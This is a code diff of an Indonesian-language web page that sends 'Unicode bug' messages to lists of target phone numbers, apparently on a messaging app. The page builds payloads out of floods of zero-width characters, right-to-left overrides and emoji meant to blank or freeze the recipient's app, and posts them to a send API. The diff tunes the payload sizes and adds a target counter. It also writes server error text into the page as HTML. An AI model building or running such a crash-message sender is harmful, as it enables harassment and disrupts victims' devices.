@@ -6,7 +6,7 @@
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      max-width: 480px;
+      max-width: 500px;
       margin: 40px auto;
       padding: 20px;
       background: #0f0f0f;
@@ -19,7 +19,7 @@
       text-shadow: 0 0 5px #00ffe1;
     }
 
-    input, textarea, select {
+    input, select {
       width: 100%;
       padding: 12px;
       margin: 8px 0;
@@ -29,34 +29,50 @@
       color: #fff;
     }
 
-    textarea::placeholder,
-    input::placeholder {
-      color: #999;
-    }
-
-    button {
+    .btn {
       width: 100%;
       padding: 14px;
       margin-top: 12px;
-      background: linear-gradient(45deg, #00ffe1, #006eff);
-      border: none;
-      color: black;
       font-weight: bold;
-      border-radius: 10px;
       font-size: 16px;
+      border-radius: 10px;
+      border: none;
       transition: 0.3s;
+    }
+
+    .btn-glow {
+      background: linear-gradient(45deg, #00ffe1, #006eff);
+      color: black;
       box-shadow: 0 0 12px #00ffe1, 0 0 18px #006eff;
     }
 
-    button:hover {
+    .btn-glow:hover {
       transform: scale(1.05);
       box-shadow: 0 0 20px #00ffe1, 0 0 25px #006eff;
+    }
+
+    .btn-plain {
+      background: #1e1e1e;
+      color: #ccc;
+      border: 1px solid #333;
+    }
+
+    .btn-plain:hover {
+      background: #2a2a2a;
+      transform: scale(1.02);
     }
 
     #status {
       margin-top: 18px;
       font-weight: bold;
       text-align: center;
+    }
+
+    #jumlah {
+      margin-top: 10px;
+      text-align: center;
+      font-size: 14px;
+      color: #aaa;
     }
   </style>
 </head>
@@ -66,18 +82,17 @@
   <label for="numbers">Nomor Target (pisahkan dengan koma):</label>
   <input id="numbers" placeholder="628123xxxxxx,628222xxxxxx" />
 
+  <div id="jumlah">Jumlah target: 0</div>
+
   <label for="bugType">Pilih Jenis Bug:</label>
   <select id="bugType">
     <option value="blank">💨 UI Delay / Blank</option>
     <option value="freeze">❄️ Freeze Emoji + RTL</option>
     <option value="lite">🫧 Kosong Ringan</option>
-    <option value="custom">✏️ Pesan Kustom</option>
   </select>
 
-  <label for="custom">Pesan Kustom (jika dipilih):</label>
-  <textarea id="custom" rows="4" placeholder="Tulis pesan sendiri di sini…"></textarea>
-
-  <button onclick="send()">🚀 Kirim Unicode Bug</button>
+  <button class="btn btn-plain" onclick="cekJumlah()">🔍 Cek Jumlah Target</button>
+  <button class="btn btn-glow" onclick="send()">🚀 Kirim Unicode Bug</button>
 
   <p id="status"></p>
 
@@ -85,37 +100,41 @@
     function getBug(type) {
       switch (type) {
         case 'blank':
-          return '\u2063\u200F\u202E\u200B\u2060'.repeat(999999999999999);
+          return '\u2063\u200F\u202E\u200B\u2060'.repeat(3000);
         case 'freeze':
           return '🤣'.repeat(1500) + '\u202E'.repeat(1500) + '‏'.repeat(1000);
         case 'lite':
           return '\u200B\u2060'.repeat(500);
-        case 'custom':
-          return document.getElementById('custom').value.trim() || '[kosong]';
         default:
           return '...';
       }
     }
 
+    function cekJumlah() {
+      const raw = document.getElementById('numbers').value.trim();
+      const list = raw.split(',').map(n => n.trim()).filter(n => n);
+      document.getElementById('jumlah').textContent = `Jumlah target: ${list.length}`;
+    }
+
     async function send() {
       const status = document.getElementById('status');
-      const raw    = document.getElementById('numbers').value.trim();
+      const raw = document.getElementById('numbers').value.trim();
       const bugType = document.getElementById('bugType').value;
+      const list = raw.split(',').map(n => n.trim()).filter(n => n);
+      const message = getBug(bugType);
 
-      if (!raw) {
+      if (list.length === 0) {
         alert('Masukkan minimal satu nomor!');
         return;
       }
 
-      const list = raw.split(',').map(s => s.trim()).filter(Boolean);
-      const message = getBug(bugType);
-      status.textContent = 'Mengirim…';
+      status.textContent = '⏳ Mengirim…';
 
       try {
         const res = await fetch('/api/send', {
-          method : 'POST',
+          method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body   : JSON.stringify(
+          body: JSON.stringify(
             list.length > 1
               ? { list, message }
               : { number: list[0], message }
@@ -123,13 +142,14 @@
         });
 
         const json = await res.json();
+
         if (json.ok) {
-          status.textContent = `✅ Berhasil kirim ke ${json.sent ?? 1} nomor`;
+          status.innerHTML = `✅ <b>Berhasil kirim!</b><br>Nomor terkirim: ${list.length}`;
         } else {
-          status.textContent = '❌ Gagal: ' + json.error;
+          status.innerHTML = `❌ <b>Gagal:</b> ${json.error}`;
         }
       } catch (err) {
-        status.textContent = '❌ Error jaringan: ' + err.message;
+        status.innerHTML = `❌ <b>Error:</b> ${err.message}`;
       }
     }
   </script>
